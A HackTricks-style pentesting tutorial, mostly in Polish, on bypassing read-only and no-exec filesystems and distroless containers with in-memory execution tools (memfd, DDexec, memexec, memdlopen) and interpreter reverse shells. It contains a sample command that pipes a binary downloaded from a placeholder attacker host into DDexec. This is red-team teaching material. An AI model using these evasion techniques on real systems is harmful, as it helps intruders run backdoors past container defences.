# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Filmy

W poniższych materiałach wideo znajdziesz techniki opisane na tej stronie wyjaśnione bardziej szczegółowo:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Coraz częściej można trafić na maszyny linuxowe zamontowane z ochroną systemu plików w trybie **read-only (ro)**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z ro filesystem jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc to nieprawda, że nie możemy nic zapisać na dysku. Ten katalog będzie jednak **zamontowany z ochroną no-exec**, więc jeśli pobierzesz tu binarkę, **nie będziesz mógł jej uruchomić**.

> [!WARNING]
> Z perspektywy red teamu, to **utrudnia pobieranie i uruchamianie** binarek, które nie są już obecne w systemie (np. backdoors lub enumeratory takie jak `kubectl`).

## Najprostsze obejście: skrypty

Zauważ, że mówiłem o binariach — możesz **uruchomić dowolny skrypt**, pod warunkiem że interpreter jest na maszynie, np. **shell script** jeśli jest obecne `sh` lub **python script** jeśli jest zainstalowany `python`.

To jednak nie zawsze wystarczy, by uruchomić twój binarny backdoor lub inne narzędzia binarne, których możesz potrzebować.

## Ominięcia w pamięci

Jeśli chcesz uruchomić binarkę, a system plików na to nie pozwala, najlepszym sposobem jest **uruchomienie jej z pamięci**, ponieważ te zabezpieczenia nie obowiązują tam.

### FD + exec syscall bypass

Jeśli masz na maszynie zaawansowane silniki skryptowe, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarkę do uruchomienia z pamięci, zapisać ją w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie objęty tymi zabezpieczeniami, a następnie wywołać **`exec` syscall** wskazując **fd jako plik do wykonania**.

W tym celu możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Przekazujesz mu binarkę, a on wygeneruje skrypt w wybranym języku z **binarką skompresowaną i zakodowaną w b64** oraz instrukcjami do **dekodowania i dekompresji** do **fd** utworzonego wywołaniem `create_memfd` i wywołaniem **exec** syscall, aby ją uruchomić.

> [!WARNING]
> To nie działa w innych językach skryptowych, takich jak PHP czy Node, ponieważ nie mają one domyślnego sposobu wywoływania surowych syscalli z poziomu skryptu, więc nie da się wywołać `create_memfd`, aby utworzyć **memory fd** do przechowania binarki.
> 
> 
> Co więcej, utworzenie zwykłego **fd** z plikiem w `/dev/shm` nie pomoże, ponieważ nie będziesz mógł go uruchomić z powodu obowiązywania **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika pozwalająca **modyfikować pamięć własnego procesu** przez nadpisanie jego **`/proc/self/mem`**.

W ten sposób, **kontrolując kod assembly**, który jest wykonywany przez proces, możesz zapisać **shellcode** i „zmodyfikować” proces, aby **wykonywał dowolny kod**.

> [!TIP]
> **DDexec / EverythingExec** pozwala załadować i **wykonać** własny **shellcode** lub **dowolną binarkę** z **pamięci**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Aby uzyskać więcej informacji o tej technice sprawdź Github lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. To **DDexec shellcode uruchomiony jako demon**, więc za każdym razem, gdy chcesz **uruchomić inną binarkę** nie musisz ponownie uruchamiać DDexec — możesz po prostu uruchomić memexec shellcode za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przesyłać nowe binarki do załadowania i uruchomienia**.

Przykład użycia **memexec do uruchamiania binarek z PHP reverse shell** znajdziesz w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) pozwala na **łatwiejszy sposób ładowania binarek** do pamięci w celu ich późniejszego uruchomienia. Może nawet umożliwić załadowanie binarek z zależnościami.

## Distroless Bypass

Aby uzyskać dedykowane wyjaśnienie **czym właściwie jest distroless**, kiedy pomaga, kiedy nie, oraz jak zmienia post-exploitation tradecraft w kontenerach, zobacz:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Kontenery distroless zawierają tylko **minimalne komponenty niezbędne do uruchomienia konkretnej aplikacji lub usługi**, takie jak biblioteki i zależności runtime, ale wyłączają większe komponenty, takie jak menedżer pakietów, shell czy narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez usunięcie niepotrzebnych komponentów** i zminimalizowanie liczby podatności, które można wykorzystać.

### Reverse Shell

W kontenerze distroless możesz **nawet nie znaleźć `sh` lub `bash`** aby uzyskać zwykły shell. Nie znajdziesz też binarek takich jak `ls`, `whoami`, `id`... wszystkiego, co zwykle uruchamiasz w systemie.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

Jednak jeśli skompromitowany kontener uruchamia np. aplikację Flask, to python jest zainstalowany i w związku z tym możesz zdobyć **Python reverse shell**. Jeśli uruchomiony jest node, możesz zdobyć Node rev shell, i to samo dotyczy praktycznie każdego **języka skryptowego**.

> [!TIP]
> Używając języka skryptowego możesz **enumerate the system** korzystając z możliwości tego języka.

Jeśli nie ma zabezpieczeń **`read-only/no-exec`**, możesz wykorzystać reverse shell do **zapisania w systemie plików swoich binarek** i ich **uruchomienia**.

> [!TIP]
> Jednak w tego typu kontenerach te zabezpieczenia zazwyczaj będą istnieć, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je obejść**.

Możesz znaleźć **przykłady** pokazujące, jak **wykorzystać niektóre podatności RCE** aby uzyskać **reverse shells** dla języków skryptowych i wykonywać binarki z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
